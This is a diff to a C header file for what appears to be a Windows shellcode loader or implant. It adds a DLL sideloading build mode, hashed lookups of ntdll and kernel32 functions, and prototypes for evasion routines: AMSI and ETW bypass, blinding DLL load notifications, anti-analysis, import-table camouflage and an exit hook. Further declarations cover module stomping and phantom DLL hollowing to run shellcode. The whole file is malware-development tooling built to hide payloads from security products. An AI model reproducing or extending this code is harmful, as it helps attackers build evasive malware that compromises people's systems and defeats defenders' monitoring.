@@ -31,8 +31,11 @@
     #define LOG_STATUS(msg, s)
 #endif
 
-// Custom entry point (CRT-free)
+// Custom entry point (CRT-free, EXE mode only)
+// DLL sideload builds use /ENTRY:DllMain from build.bat
+#ifndef BUILD_DLL
 #pragma comment(linker, "/ENTRY:Main")
+#endif
 
 // ----------- Compiler Settings (CRT-free) -----------
 #pragma comment(linker, "/NODEFAULTLIB")
@@ -46,6 +49,16 @@
 #define NtDelayExecution_JOAAT          0xC4714BC3
 #define NtCreateSection_JOAAT           0x9A538B2B
 #define NtMapViewOfSection_JOAAT        0xD3B060A1
+// ----------- Exit Hook / Elevation (ntdll exports) -----------
+#define RtlExitUserProcess_JOAAT        0x3DC05538
+#define LdrAddRefDll_JOAAT              0x807ED758
+#define NtOpenProcessToken_JOAAT        0xD5D4A26D
+#define NtQueryInformationToken_JOAAT   0x28CEAE31
+#define NtClose_JOAAT                   0xB1D7C572
+#define NtTerminateProcess_JOAAT        0x9C12CA95
+
+// ----------- Elevation (kernel32 exports) -----------
+#define GetModuleFileNameA_JOAAT        0x665A0D0F
 
 // ----------- Phantom DLL Hollowing Hashes (kernel32 exports) -----------
 #define ReadFile_JOAAT                  0x62BF1D54
@@ -147,9 +160,11 @@ PVOID FetchExportAddress(IN PVOID pModuleBase, IN UINT32 dwApiNameHash);
 VOID IatCamouflage(VOID);
 
 // ----------- Evasion -----------
+BOOL BlindDllNotifications(IN PAPI_HASHING pApi);
 BOOL PatchlessAmsiEtw(IN PAPI_HASHING pApi);
 VOID CleanupEvasion(IN PAPI_HASHING pApi);
 BOOL AntiAnalysis(VOID);
+BOOL InstallExitHook(IN PVOID pNtdll);
 
 // ----------- Module Stomping / Phantom DLL Hollowing -----------
 BOOL ModuleStomp(IN PAPI_HASHING pApi, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);
